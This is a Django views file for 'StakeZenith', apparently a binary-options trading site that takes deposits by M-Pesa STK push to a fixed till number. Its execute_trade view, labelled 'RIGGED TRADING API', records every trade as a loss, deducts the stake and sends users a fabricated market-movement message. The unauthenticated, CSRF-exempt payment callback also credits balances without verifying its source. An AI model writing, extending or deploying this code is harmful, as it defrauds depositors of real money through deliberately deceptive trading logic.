from decimal import Decimal
import json
import requests
from datetime import datetime
from django.shortcuts import render
from django.http import JsonResponse
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_exempt
from .models import ZenithProfile, ZenithDeposit, ZenithTrade
from .mpesa_config import MpesaAccessToken, MpesaC2bCredential, LipanaMpesaPassword

# --- SPA HOME ---
def home(request):
    return render(request, 'index.html')

# --- AUTHENTICATION APIS ---
def api_register(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        username = data.get('username')
        password = data.get('password')
        if User.objects.filter(username=username).exists():
            return JsonResponse({'success': False, 'message': 'Username taken.'})
        user = User.objects.create_user(username=username, password=password)
        login(request, user)
        return JsonResponse({'success': True})

def api_login(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        user = authenticate(username=data.get('username'), password=data.get('password'))
        if user is not None:
            login(request, user)
            return JsonResponse({'success': True})
        return JsonResponse({'success': False, 'message': 'Invalid credentials.'})

def api_logout(request):
    logout(request)
    return JsonResponse({'success': True})

# --- RIGGED TRADING API ---
@login_required
def execute_trade(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            
            # Safely convert the incoming amount to a Decimal
            amount_val = data.get('amount', 0)
            amount = Decimal(str(amount_val)) 
            t_type = data.get('type') # CALL or PUT
            
            profile = request.user.zenithprofile
            
            if profile.balance < amount:
                return JsonResponse({'success': False, 'message': 'Insufficient Balance. Please deposit.'})

            # Rigged Logic: Deduct balance successfully
            profile.balance -= amount
            profile.save()

            # Record the lost trade
            ZenithTrade.objects.create(user=request.user, amount=amount, trade_type=t_type, outcome="LOSS")

            return JsonResponse({
                'success': True,
                'new_balance': float(profile.balance), # Send back as float for JS to read
                'message': f'Trade Expired OTM (Loss). Market spiked against your {t_type} position.'
            })
        except Exception as e:
            # If anything fails, return a proper error message instead of crashing
            return JsonResponse({'success': False, 'message': str(e)}, status=500)
        
# --- M-PESA LOGIC ---
def trigger_stk_push(phone_number, amount, account_ref):
    if phone_number.startswith('+'): phone_number = phone_number[1:]
    if phone_number.startswith('0'): phone_number = '254' + phone_number[1:]

    access_token = MpesaAccessToken.get_access_token()
    headers = {"Authorization": f"Bearer {access_token}"}
    password, timestamp, short_code = LipanaMpesaPassword.get_password()
    till_number = "8595330" 

    payload = {
        "BusinessShortCode": short_code,
        "Password": password,
        "Timestamp": timestamp,
        "TransactionType": "CustomerBuyGoodsOnline",
        "Amount": int(amount),
        "PartyA": phone_number,
        "PartyB": till_number,
        "PhoneNumber": phone_number,
        "CallBackURL": MpesaC2bCredential.call_back_url,
        "AccountReference": account_ref,
        "TransactionDesc": "StakeZenith Deposit"
    }
    response = requests.post(MpesaC2bCredential.request_api_url, json=payload, headers=headers, timeout=30)
    if response.status_code != 200: raise Exception(f"Safaricom API Error: {response.text}")
    resp_json = response.json()
    return resp_json.get('CheckoutRequestID'), resp_json.get('MerchantRequestID')

@login_required
def initiate_mpesa_payment(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        phone_number = data.get('phone_number')
        amount = data.get('amount')

        try:
            account_ref = f"SZ{request.user.id}"
            checkout_id, merchant_id = trigger_stk_push(phone_number, amount, account_ref)

            ZenithDeposit.objects.create(
                user=request.user, amount=amount, phone_number=phone_number,
                checkout_request_id=checkout_id, merchant_request_id=merchant_id
            )
            return JsonResponse({'success': True, 'message': "STK push sent! Enter PIN.", 'checkout_request_id': checkout_id})
        except Exception as e:
            return JsonResponse({'success': False, 'message': str(e)}, status=500)

@login_required
def check_payment_status(request, checkout_request_id):
    try:
        tx = ZenithDeposit.objects.get(checkout_request_id=checkout_request_id, user=request.user)
        if tx.is_complete:
            return JsonResponse({'status': 'COMPLETED', 'message': 'Deposit Successful!', 'new_balance': float(request.user.zenithprofile.balance)})
        return JsonResponse({'status': 'PENDING'})
    except ZenithDeposit.DoesNotExist:
        return JsonResponse({'status': 'NOT_FOUND'}, status=404)

@csrf_exempt
def mpesa_callback(request):
    try: data = json.loads(request.body)
    except: return JsonResponse({'error': 'Bad data.'}, status=400)

    callback = data.get('Body', {}).get('stkCallback', {})
    result_code = callback.get('ResultCode', 1)
    checkout_id = callback.get('CheckoutRequestID', '')

    try: tx = ZenithDeposit.objects.get(checkout_request_id=checkout_id)
    except ZenithDeposit.DoesNotExist: return JsonResponse({'ResultCode': 1, 'ResultDesc': 'Not found.'})

    tx.result_code = result_code
    tx.result_description = callback.get('ResultDesc', 'Failed')

    if result_code != 0:
        tx.is_complete = False
        tx.save()
        return JsonResponse({'ResultCode': result_code, 'ResultDesc': tx.result_description})

    # SUCCESS LOGIC - ADD MONEY TO BALANCE
    for item in callback.get('CallbackMetadata', {}).get('Item', []):
        if item.get('Name') == 'MpesaReceiptNumber': tx.mpesa_receipt_number = item.get('Value')

    tx.is_complete = True
    tx.save()

    # Update User Balance
    profile = tx.user.zenithprofile
    profile.balance += tx.amount
    profile.save()

    return JsonResponse({'ResultCode': 0, 'ResultDesc': 'Accepted'})